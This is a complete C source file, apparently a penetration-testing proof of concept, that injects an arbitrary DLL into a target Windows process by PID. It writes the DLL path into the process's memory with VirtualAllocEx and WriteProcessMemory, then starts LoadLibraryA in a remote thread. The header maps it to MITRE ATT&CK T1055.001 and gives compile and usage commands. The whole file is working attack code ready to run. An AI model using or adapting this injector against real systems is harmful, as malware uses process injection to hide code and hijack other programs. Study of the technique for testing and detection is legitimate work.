/*
 * DLL Injection — LoadLibrary via CreateRemoteThread
 *
 * Technique: Write DLL path into target process, call LoadLibraryA
 *            in a remote thread to load the DLL.
 *
 * MITRE ATT&CK: T1055.001 — Dynamic-link Library Injection
 *
 * Compile:
 *   x86_64-w64-mingw32-gcc -o dll_inject.exe dll_injection.c
 *   cl dll_injection.c /Fe:dll_inject.exe
 *
 * Usage:
 *   dll_inject.exe <PID> <full_path_to_dll>
 *   dll_inject.exe 1234 C:\payloads\calc.dll
 */

#include <windows.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char* argv[]) {
    if (argc < 3) {
        printf("DLL Injection — VAPT PoC\n");
        printf("Usage: %s <PID> <DLL_PATH>\n\n", argv[0]);
        printf("Example:\n");
        printf("  %s 1234 C:\\payloads\\calc-pop\\calc.dll\n", argv[0]);
        return 1;
    }

    DWORD pid = atoi(argv[1]);
    char* dllPath = argv[2];
    size_t dllPathLen = strlen(dllPath) + 1;

    // Verify DLL exists
    if (GetFileAttributesA(dllPath) == INVALID_FILE_ATTRIBUTES) {
        printf("[-] DLL not found: %s\n", dllPath);
        return 1;
    }

    printf("[*] DLL Injection PoC\n");
    printf("[*] Target PID: %lu\n", pid);
    printf("[*] DLL Path: %s\n", dllPath);

    // Step 1: Open target process
    HANDLE hProcess = OpenProcess(
        PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
        FALSE, pid);

    if (!hProcess) {
        printf("[-] OpenProcess failed (error %lu)\n", GetLastError());
        return 1;
    }
    printf("[+] Process opened\n");

    // Step 2: Allocate memory for DLL path
    LPVOID remoteDllPath = VirtualAllocEx(hProcess, NULL, dllPathLen,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (!remoteDllPath) {
        printf("[-] VirtualAllocEx failed (error %lu)\n", GetLastError());
        CloseHandle(hProcess);
        return 1;
    }
    printf("[+] Allocated %zu bytes at 0x%p\n", dllPathLen, remoteDllPath);

    // Step 3: Write DLL path
    SIZE_T bytesWritten;
    if (!WriteProcessMemory(hProcess, remoteDllPath, dllPath, dllPathLen, &bytesWritten)) {
        printf("[-] WriteProcessMemory failed (error %lu)\n", GetLastError());
        VirtualFreeEx(hProcess, remoteDllPath, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }
    printf("[+] DLL path written (%zu bytes)\n", bytesWritten);

    // Step 4: Get LoadLibraryA address
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    FARPROC pLoadLibrary = GetProcAddress(hKernel32, "LoadLibraryA");

    if (!pLoadLibrary) {
        printf("[-] Could not resolve LoadLibraryA\n");
        VirtualFreeEx(hProcess, remoteDllPath, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }
    printf("[+] LoadLibraryA @ 0x%p\n", (void*)pLoadLibrary);

    // Step 5: Create remote thread calling LoadLibraryA
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
        (LPTHREAD_START_ROUTINE)pLoadLibrary, remoteDllPath, 0, NULL);

    if (!hThread) {
        printf("[-] CreateRemoteThread failed (error %lu)\n", GetLastError());
        VirtualFreeEx(hProcess, remoteDllPath, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }
    printf("[+] Remote thread created, DLL loading...\n");

    WaitForSingleObject(hThread, 10000);

    // Check if DLL loaded
    DWORD exitCode;
    GetExitCodeThread(hThread, &exitCode);
    if (exitCode != 0) {
        printf("[+] DLL loaded successfully (base 0x%lx)\n", exitCode);
    } else {
        printf("[-] DLL may have failed to load (LoadLibrary returned NULL)\n");
    }

    // Cleanup
    VirtualFreeEx(hProcess, remoteDllPath, 0, MEM_RELEASE);
    CloseHandle(hThread);
    CloseHandle(hProcess);

    return 0;
}
